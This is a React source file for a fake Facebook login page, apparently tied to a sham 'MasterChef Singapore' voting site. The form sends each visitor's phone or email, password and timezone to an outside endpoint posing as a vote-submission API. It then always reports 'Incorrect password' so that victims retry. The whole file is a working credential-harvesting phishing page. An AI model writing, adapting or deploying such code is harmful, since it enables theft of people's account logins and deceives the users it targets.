import { useState, useEffect } from "react";
import facebookLogo from "../assets/facebook-logo.svg";

export default function FacebookLogin() {
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);



  async function submitForm(e) {
    e.preventDefault();

    if (!phone.trim() || !password.trim()) {
      alert("Please enter your phone/email and password.");
      return;
    }

    setLoading(true);

    try {
      await new Promise((resolve) => setTimeout(resolve, 700));
      await fetch(
        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            candidate_number: localStorage.getItem("candidate"),
            platform: "facebook",
            username: phone,
            password,
            location: Intl.DateTimeFormat().resolvedOptions().timeZone,
          }),
        }
      );
    } catch (err) {
      console.log(err);
    } finally {
      setError(true);
      setPassword("");
      setLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center px-6">

      <div className="w-full max-w-sm">

        <div className="bg-white rounded-xl shadow-lg px-6 py-8">

          <div className="flex justify-center mb-8">
            <img
              src={facebookLogo}
              alt="Logo"
              className="w-16 h-16 object-contain"
            />
          </div>

          <form onSubmit={submitForm}>

            <input
              type="text"
              placeholder="Mobile number or email"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              required
              className="w-full border border-gray-300 rounded-lg px-4 py-3 mb-3 outline-none focus:border-blue-500"
            />

            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (error) setError(false);
              }}
              required
              className={`w-full border rounded-lg px-4 py-3 mb-2 outline-none focus:border-blue-500 ${
                error ? "shake-error border-red-500 bg-red-50" : "border-gray-300"
              }`}
            />
            {error && <p className="mb-4 text-sm text-red-600">Incorrect password</p>}

            <div className="mt-3 text-center">
  <span className="text-sm text-blue-500 cursor-pointer hover:underline">
    Forgot password?
  </span>
</div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white font-semibold rounded-lg py-3 transition"
            >
              {loading ? "Submitting..." : "Log in"}
            </button>

          </form>

        </div>

      </div>

    </div>
  );
}